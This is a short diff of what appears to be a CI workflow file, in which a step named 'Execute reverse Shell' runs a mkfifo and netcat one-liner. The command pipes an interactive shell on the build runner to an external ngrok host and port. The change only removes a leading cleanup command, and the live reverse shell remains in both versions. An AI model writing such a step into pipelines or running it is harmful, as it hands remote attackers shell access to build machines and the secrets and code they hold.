@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Execute reverse Shell
-        run: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 6.tcp.ngrok.io 18627 >/tmp/f
+        run: mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 6.tcp.ngrok.io 18627 >/tmp/f
 
       # Runs a set of commands using the runners shell
       - name: Done Execution
